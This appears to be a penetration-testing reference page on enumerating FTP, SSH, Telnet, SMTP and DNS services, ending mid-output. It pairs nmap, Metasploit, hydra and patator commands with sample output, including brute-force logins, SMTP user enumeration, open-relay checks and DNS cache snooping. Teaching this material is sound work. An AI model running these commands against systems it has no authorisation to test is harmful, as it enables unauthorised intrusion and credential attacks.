synchronise<!-- TITLE: Service Enumeration -->
<!-- SUBTITLE: A quick summary of Service Enumeration -->

Common Services and Enumeration

I will try to make this chapter into a reference library. So that you can just check in this chapter to see common ways to exploit certain common services. I will only discuss the most common, since there are quite a few.

# Methodology

- **Enumerate**
  - Use steps below to exfiltrate as much data as we can from identified services.
  - Give all services the lookover before planning an attack vector.
- **Known Vulnerabilities**
  - Check if the service has any known publicly disclosed vulnerabilities.
- **Exploitable**
  - Search for any available public exploits, especially RCE which can provide a few easy wins.
- **Brute Forceable**
  - Always try common weak or default passwords.
  - Check for password re-use as soon as new credentials are disocvered.

# Port X - Service unknown

If you have a port open with unknown service you can do this to find out which service it might be.

```text
amap -d 192.168.19.244 8000
```

# Port 21 - FTP

Common FTP servers you may find:

"Alfresco Document Management System ftpd"
"D-Link Printer Server ftpd"
"FreeBSD ftpd 6.00LS"
"HP JetDirect ftpd"
"HP LaserJet P4014 printer ftpd"
"Konica Minolta bizhub printer ftpd"
"Microsoft ftpd"
"National Instruments LabVIEW ftpd"
"NetBSD lukemftpd"
"Nortel CES1010E router ftpd"
"oftpd"
"OpenBSD ftpd 6.4 Linux port 0.17"
"PacketShaper ftpd"
"ProFTPD 1.3.3"
"Pure-FTPd"
"Ricoh Aficio MP 2000 printer ftpd 6.15"
"Ricoh Aficio MP 2000 printer ftpd 6.17"
"Ricoh Aficio MP 2352 printer ftpd 10.67"
"Ricoh Aficio MP 4002 printer ftpd 11.103"
"Ricoh Aficio MP W3600 printer ftpd 6.15"
"Ricoh Aficio SP 3500SF printer ftpd 75905e"
"vsftpd"
"vsftpd 2.0.4+ (ext.3)"
"vsftpd 2.0.5"
"vsftpd 2.0.8 or later"
"vsftpd 2.2.2"
"vsftpd 3.0.2"
"vsftpd (before 2.0.8) or WU-FTPD"
"WU-FTPD or MIT Kerberos ftpd 5.60"
"WU-FTPD or MIT Kerberos ftpd 6.00L

Connect to the ftp-server to enumerate software and version

```text
ftp 192.168.1.101
nc 192.168.1.101 21
```

Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with `anonymous:anonymous`.

> If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them!  
> use `binary` or `ascii` commands to switch

## Nmap


```text
nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA 10.10.10.10_ftp_NSE 10.10.10.10
```

After obtaining all the required details, we can check for any publicly available exploits with `searchsploit`

## Metasploit


### FTP Version Scanner

This can be done using

```
use auxiliary/scanner/ftp/ftp_version
services -p 21 -R
```

Sample Output:

```
[*] 172.16.xx.xx:21 FTP Banner: '220 BDL095XXXX FTP server ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] Auxiliary module execution completed
```

### Anonymous FTP Access Detection

Detect anonymous (read/ write) FTP server access.

A sample of results is
```
[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
```

### FTP Authentication Scanner

FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.
```
use auxiliary/scanner/ftp/ftp_login
services -p 21 -R
```

## Summary

1. Grab banners and check version
2. Check for available exploits
3. Test for anonymous logins
4. Brute force if we know any user accounts

# Port 22 - SSH

SSH is such an old and fundamental technology so most modern version are quite hardened. We can start doing the standard checks:

* Grab banners to detect version
* Check authentication method, public_key or password?
* Attempt common passwords
* Brute force

## SSH Enumeration

You can find out the version of the SSH either but scanning it with nmap or by connecting with it using `nc`.

```text
nc 192.168.1.10 22
```

It returnes something like this:  
`SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1`

This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. [http://www.openssh.com/txt/rfc4253.txt](http://www.openssh.com/txt/rfc4253.txt)  
The protocol-version string should be defined like this: `SSH-protoversion-softwareversion SP comments CR LF`  
Where comments is optional. And SP means space, and CR \(carriege return\) and LF \(Line feed\)  
So basically the comments should be separated by a space.

## Brute force

Using `hydra`

```text
hydra -L /home/10.10.10.228/loot/userlist.txt -e nsr 10.10.10.228 -s 22 ssh
hydra -L /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt -e nsr 10.10.10.228 -s 22 ssh
```

## Summary

- If SSH is enabled, make note of it as it may be leveraged later on in further attacks
  - Injection attacks enabling us to write our own RSA key and obtain SSH access
  - Brute force

# Port 23 - Telnet

Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out.

## Brute forcing telnet

You can also brute force it like this:

```text
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
```

# Port 25 - SMTP

SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. Here are some things to we can do when enumerating a SMTP server:

## Checklist
- Grab banners and version
- Check vulnerabilities and exploits
- Check for open-relay
- Check supports commands
- Use VRFY to enumerate users

## Metasploit

### SMTP Version

SMTP Banner Grabber.

```
use auxiliary/scanner/smtp/smtp_version
services -p 25 -u -R
```
Sample Output

```
[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a
[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a
```

### SMTP Open Relays

Tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods

```
use auxiliary/scanner/smtp/smtp_relay
services -p 25 -u -R
```

You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.

Sample Output:

```
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
[*] 172.16.xx.xx:25 - No relay detected
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
```

### SMTP User Enumeration Utility

Allows the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.

```
use auxiliary/scanner/smtp/smtp_enum
services -p 25 -u -R
```

Sample Output:

```
[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530)
[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
```

## Nmap NSE scripts

- **smtp-brutes** : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.

- **smtp-commands** : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.

- **smtp-user-enum** : Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP ENUM in metasploit.

```text
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
```

- **smtp-open-relay** : Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.

Sample Output:

```
nmap -iL email_servers -v --script=smtp-open-relay -p 25
Nmap scan report for 10.10.xx.xx
Host is up (0.00039s latency).
PORT     STATE  SERVICE
25/tcp   open   smtp
| smtp-open-relay: Server is an open relay (14/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@sysmailsrv.example.com> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@sysmailsrv.example.com>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@[10.10.8.136]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@sysmailsrv.example.com:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.10.8.136]>
|_ MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@sysmailsrv.example.com>
MAC Address: 00:50:56:B2:21:A9 (VMware)
```

## Command Reference

### Nmap NSE scan using common SMTP scripts

```text
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.140 -oA 10.10.10.140_smtp_NSE
```


## Other

### SMTP Commands

SMTP supports the below commands:

```
ATRN   Authenticated TURN
AUTH   Authentication
BDAT   Binary data
BURL   Remote content
DATA   The actual email message to be sent. This command is terminated with a line that contains only a .
EHLO   Extended HELO
ETRN   Extended turn
EXPN   Expand
HELO   Identify yourself to the SMTP server.
HELP   Show available commands
MAIL   Send mail from email account
MAIL FROM: me@mydomain.com
NOOP   No-op. Keeps you connection open.
ONEX   One message transaction only
QUIT   End session
RCPT   Send email to recipient
RCPT TO: you@yourdomain.com
RSET   Reset
SAML   Send and mail
SEND   Send
SOML   Send or mail
STARTTLS
SUBMITTER      SMTP responsible submitter
TURN   Turn
VERB   Verbose
VRFY   Verify
```

### Send an email via telnet

The following is an actual SMTP session. All sessions must start with HELO and end with QUIT.

```
HELO my.server.com
MAIL FROM: <me@mydomain.com>
RCPT TO: <you@yourdomain.com>
DATA
From: Danny Dolittle
To: Sarah Smith
Subject: Email sample
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii

This is a test email for you to read.
.
QUIT
```

### Verifying users

```text
nc 192.168.1.103 25                                                                               

220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY roooooot
550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table
```

### Using Patator

```text
patator smtp_vrfy host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt timeout=15 -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421
```

Sample Output:

```text
07:29:37 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-04-08 07:29 AEST
07:29:37 patator    INFO -                                                                              
07:29:37 patator    INFO - code  size   time | candidate                          |   num | mesg
07:29:37 patator    INFO - -----------------------------------------------------------------------------
07:29:51 patator    INFO - 252   12    1.004 | backup                             |   135 | 2.0.0 backup
07:30:50 patator    INFO - 252   11    0.002 | games                              |   682 | 2.0.0 games
07:31:11 patator    INFO - 252   9     0.004 | irc                                |   821 | 2.0.0 irc
07:31:17 patator    INFO - 252   10    1.006 | mail                               |   956 | 2.0.0 mail
07:31:32 patator    INFO - 252   10    0.001 | news                               |  1093 | 2.0.0 news
07:31:59 patator    INFO - 252   11    1.002 | proxy                              |  1360 | 2.0.0 proxy
07:32:15 patator    INFO - 252   10    0.001 | root                               |  1425 | 2.0.0 root
07:32:26 patator    INFO - 252   12    1.004 | syslog                             |  1606 | 2.0.0 syslog
07:32:38 patator    INFO - 252   10    1.003 | user                               |  1714 | 2.0.0 user
```

## Summary

- Compile list of enumerated users
  - Can be used to brute force other services or web applications
- Launch client-side attacks using open-relay
- Sending malicious email to a verified user

## Reference list

[https://cr.yp.to/smtp/vrfy.html](https://cr.yp.to/smtp/vrfy.html)

[http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/](http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/)

[http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html](http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html)

[http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

[https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/](https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/)

# Port 53 - DNS

## Metasploit

### DNS Bruteforce Enumeration

Uses a dictionary to perform a brute force attack to enumerate hostnames and subdomains available under a given domain

    use auxiliary/gather/dns_bruteforce

Sample Output:

    [+] Host autodiscover.example.com with address 10.10.xx.xx found
    [+] Host b2b.example.com with address 10.10.xx.xx found
    [+] Host blog.example.com with address 10.10.xx.xx found

### DNS Basic Information Enumeration

Module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.

    use auxiliary/gather/dns_info

Sample Output:
```
    [*] Enumerating example.com
    [+] example.com - Address 93.184.xx.xx found. Record type: A
    [+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
    [+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
    [+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
    [+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
    [+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
    [+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
    [+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
    [+] example.com - Text info found: v=spf1 -all . Record type: TXT
    [+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
    [*] Auxiliary module execution completed
```

### DNS Reverse Lookup Enumeration

Module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.

    use auxiliary/gather/dns_reverse_lookup

### DNS Common Service Record Enumeration

Module enumerates common DNS service records in a given domain.

Sample Output:
```
    use auxiliary/gather/dns_srv_enum
    set domain example.com
    run

    [*] Enumerating SRV Records for example.com
    [+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
    [+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
    [*] Auxiliary module execution completed
```
### DNS Record Scanner and Enumerator

Module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.

    use auxiliary/gather/enum_dns

Sample Output:
```
    [*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx
    [*] Retrieving general DNS records
    [*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A
    [*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX
    [*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
    [*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX
    [*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
    [*] zonetransfer.me.        301     IN      TXT
    [*] Text: zonetransfer.me.        301     IN      TXT
    [*] Performing zone transfer against all nameservers in zonetransfer.me
    [*] Testing nameserver: nsztm2.digi.ninja.
    W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP
    W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
    W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one
    F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting
    [-] Zone transfer failed (length was zero)
    [*] Testing nameserver: nsztm1.digi.ninja.
    W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP
    W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
    W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one
    F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting
    [-] Zone transfer failed (length was zero)
    [*] Enumerating SRV records for zonetransfer.me
    [*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0
    [*] Done
    [*] Auxiliary module execution completed
```
Two interesting metasploit modules which we found are

### DNS Amplification Scanner

Test for the DNS Amplification Tests.

    auxiliary/scanner/dns/dns_amp
    services -p 53 -u -R

Sample Output:
```
    [*] Sending 67 bytes to each host using the IN ANY isc.org request
    [+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
    [+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]
    [+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
    [+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]
```
### DNS Non-Recursive Record Scraper

Can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.

    use auxiliary/gather/dns_cache_scraper

Sample Output:
```
    [*] Making queries against 103.8.xx.xx
    [+] dnl-01.geo.kaspersky.com - Found
    [+] downloads2.kaspersky-labs.com - Found
    [+] liveupdate.symantecliveupdate.com - Found
    [+] liveupdate.symantec.com - Found
    [+] update.symantec.com - Found
    [+] update.nai.com - Found
    [+] guru.avg.com - Found
    [*] Auxiliary module execution completed
```

### Zone Transfer

If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.

    host <domain> <optional_name_server>
    host -t ns <domain>                -- Name Servers
    host -t a <domain>                 -- Address
    host -t aaaa <domain>              -- AAAA record points a domain or subdomain to an IPv6 address
    host -t mx <domain>                -- Mail Servers
    host -t soa <domain>               -- Start of Authority
    host <IP>                          -- Reverse Lookup
    host -l <Domain Name> <DNS Server> -- Domain Zone Transfer

Example:

    host scanme.nmap.org
    scanme.nmap.org has address 45.33.32.156
    scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f

## Nmap

Nmap has around 19-20 NSE Scripts for DNS, we haven’t mentioned all the NSE here, only which we were able to use.:

### Broadcast-dns-service-discovery

<a href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html" class="reference external">broadcast-dns-service-discovery.nse</a> : Attempts to discover hosts’ services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.

Sample Output:

    nmap --script=broadcast-dns-service-discovery

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-12 14:53 IST
    Pre-scan script results:
    | broadcast-dns-service-discovery:
    |   172.30.xx.xx
    |     9/tcp workstation
    |       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
    |     22/tcp udisks-ssh
    |       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
    |   172.30.xx.xx
    |     2020/tcp teamviewer
    |       DyngateID=164005815
    |       Token=CrzebHH5rkzIEBsP
    |       UUID=119e36d8-4366-4495-9e13-c44be02851f0
    |_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e
    WARNING: No targets were specified, so 0 hosts scanned.
    Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds

It’s surprising why teamviewer will broadcast its ID, then we mostly need 4 digit pin just to control the machine.

### DNS-blacklist

<a href="https://nmap.org/nsedoc/scripts/dns-blacklist.html" class="reference external">dns-blacklist.nse</a> (External IP Only) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged

### DNS-brute

<a href="https://nmap.org/nsedoc/scripts/dns-brute.html" class="reference external">dns-brute.nse</a> : This is similar to the msf dns\_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.

Sample Output:

    nmap --script dns-brute www.example.com -sn -n -Pn

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:23 IST
    Nmap scan report for www.example.com (116.50.xx.xx)
    Host is up.
    Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0

    Host script results:
    | dns-brute:
    |   DNS Brute-force hostnames:
    |     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989
    |     images.example.com - 116.50.xx.xx
    |     images.example.com - 64:ff9b:0:0:0:0:7432:404b
    |     dns.example.com - 116.50.xx.xx
    |     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6
    |     web.example.com - 203.199.xx.xx
    |     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911
    |     exchange.example.com - 203.199.xx.xx
    |     mail.example.com - 116.50.xx.xx
    |     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7
    |     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7
    |     blog.example.com - 116.50.xx.xx
    |     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb
    |     www.example.com - 116.50.xx.xx
    |     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0
    |     sip.example.com - 116.50.xx.xx
    |     sip.example.com - 116.50.xx.xx
    |     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56
    |     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9
    |     mobile.example.com - 116.50.xx.xx
    |_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18

    Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds

### DNS-Cache-snoop

<a href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html" class="reference external">dns-cache-snoop.nse</a> : This module is similar to dns\_cache\_scraper. Perform DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with “www.” and once without. Use the dns-cache-snoop.domains script argument to use a different list.

Sample Output with no arguments:

    nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:30 IST
    Nmap scan report for ns5.xxxxxx.co.in (103.8.xx.xx)
    Host is up (0.067s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    | dns-cache-snoop: 83 of 100 tested domains are cached.
    | google.com
    | www.google.com
    | facebook.com
    | www.facebook.com
    | youtube.com
    | www.youtube.com
    | yahoo.com
    | www.yahoo.com

Sample Output with custom list of websites:
```
    nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}' 103.8.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-05 23:33 IST
    Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
    Host is up (0.11s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    | dns-cache-snoop: 2 of 3 tested domains are cached.
    | dnl-01.geo.kaspersky.com
    |_update.symantec.com
```

### DNS-Check-zone

<a href="https://nmap.org/nsedoc/scripts/dns-check-zone.html" class="reference external">dns-check-zone.nse</a> : Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.

Sample Output:

    nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args='dns-check-zone.domain=example.com'

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:33 IST
    Nmap scan report for aster.example.co.in (202.191.xx.xx)
    Host is up.
    Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42
    rDNS record for 202.191.xx.xx: segment-202-191.sify.net
    Host script results:
    | dns-check-zone:
    | DNS check results for domain: example.com
    |   MX
    |     PASS - Reverse MX A records
    |       All MX records have PTR records
    |   SOA
    |     PASS - SOA REFRESH
    |       SOA REFRESH was within recommended range (3600s)
    |     PASS - SOA RETRY
    |       SOA RETRY was within recommended range (600s)
    |     PASS - SOA EXPIRE
    |         SOA EXPIRE was within recommended range (1209600s)
    |     PASS - SOA MNAME entry check
    |       SOA MNAME record is listed as DNS server
    |     PASS - Zone serial numbers
    |       Zone serials match
    |   NS
    |     FAIL - Recursive queries
    |       The following servers allow recursive queries: 45.33.xx.xx
    |     PASS - Multiple name servers
    |       Server has 2 name servers
    |     PASS - DNS name server IPs are public
    |       All DNS IPs were public
    |     PASS - DNS server response
    |       All servers respond to DNS queries
    |     PASS - Missing nameservers reported by parent
    |       All DNS servers match
    |     PASS - Missing nameservers reported by your nameservers
    |_      All DNS servers match

    Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds

### DNS-nsid

<a href="https://nmap.org/nsedoc/scripts/dns-nsid.html" class="reference external">dns-nsid.nse</a> : Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.

Sample Output:

    nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:37 IST
    Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
    Host is up (0.097s latency).
    PORT   STATE SERVICE
    53/tcp open  domain
    53/udp open  domain
    | dns-nsid:
    |_  bind.version: 9.3.3rc2

    Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds

### DNS-recursion

<a href="https://nmap.org/nsedoc/scripts/dns-recursion.html" class="reference external">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.

Sample Output:
```
    nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:39 IST
    Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
    Host is up (0.094s latency).
    PORT   STATE SERVICE
    53/udp open  domain
    |_dns-recursion: Recursion appears to be enabled

    Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```
### DNS-Service-Discovery

<a href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html" class="reference external">dns-service-discovery.nse</a> : Attempts to discover target hosts’ services using the DNS Service Discovery protocol. The script first sends a query for \_services.\_dns-sd.\_udp.local to get a list of services. It then sends a followup query for each one to try to get more information.

Sample Output:

    Yet to run
    nmap --script=dns-service-discovery -p 5353 <target>

### DNS-SRV-Enum

<a href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html" class="reference external">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:

-   Active Directory Global Catalog
-   Exchange Autodiscovery
-   Kerberos KDC Service
-   Kerberos Passwd Change Service
-   LDAP Servers
-   SIP Servers
-   XMPP S2S
-   XMPP C2S

Sample Output:

    Yet to run

### DNS-Zone-Transfer

<a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html" class="reference external">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.

Sample Output:
```
    nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-06 09:49 IST
    Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)
    Host is up (0.29s latency).
    Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e
    rDNS record for 167.88.xx.xx: zonetransfer.me
    Not shown: 996 closed ports
    PORT     STATE    SERVICE
    53/tcp   open     domain
    | dns-zone-transfer:
    | zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
    | zonetransfer.me.                                HINFO  "Casio fx-700G" "Windows XP"
    | zonetransfer.me.                                TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
    | zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.
    | zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.
    | zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.
